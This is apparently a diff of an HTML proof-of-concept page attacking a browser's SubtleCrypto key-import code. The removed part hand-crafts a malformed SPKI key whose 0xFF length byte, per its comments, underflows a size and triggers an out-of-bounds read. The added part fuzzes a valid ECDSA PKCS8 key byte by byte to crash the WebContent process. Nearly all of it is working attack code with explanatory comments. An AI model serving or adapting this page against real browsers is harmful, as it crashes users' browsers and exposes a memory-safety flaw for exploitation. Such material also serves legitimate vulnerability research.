@@ -11,48 +11,51 @@ body { background:#000; color:#0f0; font-family:monospace; font-size:13px; paddi
 <script>
 function log(m,c){var d=document.createElement("div");d.className=c||'';d.textContent=m;document.getElementById("log").appendChild(d);}
 
-log("=== SUBTLECRYPTO OUT-OF-BOUNDS READ ===", "info");
-log("[*] Forging a cursed SPKI key...", "info");
+log("=== SUBTLECRYPTO PKCS8 FUZZ BOMB ===", "info");
+log("[*] Generating a 100% valid ECDSA key pair...", "info");
 
-// We are hand-crafting an SPKI payload to pass all the initial checks
-// and perfectly hit the missing bounds check at the very end.
-let keyData = new Uint8Array(19);
-keyData[0] = 0x30; // SEQUENCE
-keyData[1] = 0x00; // length=0
+async function detonate() {
+    try {
+        let keyPair = await crypto.subtle.generateKey(
+            { name: "ECDSA", namedCurve: "P-256" },
+            true,
+            ["sign", "verify"]
+        );
+        
+        log("[*] Key generated! Exporting to PKCS8...", "info");
+        let exported = await crypto.subtle.exportKey("pkcs8", keyPair.privateKey);
+        let validKey = new Uint8Array(exported);
+        
+        log("[!] PKCS8 size: " + validKey.length + " bytes", "warn");
+        log("[!] Commencing carpet bombing...", "hit");
+        
+        // We don't guess the right length byte. 
+        // We create a mutated copy for EVERY single byte in the key,
+        // set it to 0xFF (the length overflow detonator), and feed it back!
+        for (let i = 0; i < validKey.length; i++) {
+            let poison = new Uint8Array(validKey);
+            poison[i] = 0xFF; 
+            
+            // Fire and forget! One of these will hit the missing bounds check
+            // and call subvector() out of bounds, instantly killing the process!
+            crypto.subtle.importKey(
+                "pkcs8", 
+                poison, 
+                { name: "ECDSA", namedCurve: "P-256" }, 
+                true, 
+                ["sign"]
+            ).catch(e => {
+                // We ignore graceful rejections. We only care about the CRASH.
+            });
+        }
+        
+        log("[*] Bombs dropped! If you can still read this, they survived.", "info");
+    } catch(e) {
+        log("[-] Setup error: " + e.message, "warn");
+    }
+}
 
-// IdEcPublicKey (1.2.840.10045.2.1) -> 7 bytes
-keyData.set([0x2A, 0x86, 0x48, 0xCE, 0x3D, 0x02, 0x01], 2);
-
-// P-256 OID (1.2.840.10045.3.1.7) -> 8 bytes
-keyData.set([0x2A, 0x86, 0x48, 0xCE, 0x3D, 0x03, 0x01, 0x07], 9);
-
-keyData[17] = 0x00; // BIT STRING tag (or whatever is skipped)
-
-// THE DETONATOR
-keyData[18] = 0xFF; // bytesUsedToEncodedLength(0xFF) returns 128!
-// The C++ code will add 128 + 1 to the index, pushing it to 147.
-// The array is only 19 bytes long.
-// Then it calculates: keyData.size() - index  --> 19 - 147
-// This UNDERFLOWS a size_t, resulting in 18 Quintillion bytes!
-// It passes this massive size to the Apple Crypto library, which tries to read it.
-// BOOM!
-
-log("[!] Detonator set at byte 18. Importing key...", "warn");
-log("[!] Watch the WebContent process crash instantly...", "hit");
-
-setTimeout(() => {
-    crypto.subtle.importKey(
-        "spki", 
-        keyData, 
-        { name: "ECDSA", namedCurve: "P-256" }, 
-        true, 
-        ["verify"]
-    ).then(() => {
-        log("[-] Survived? The bounds check must be patched.", "info");
-    }).catch(e => {
-        log("[-] Caught error (might have been rejected gracefully): " + e.message, "info");
-    });
-}, 500);
+detonate();
 </script>
 </body>
 </html>
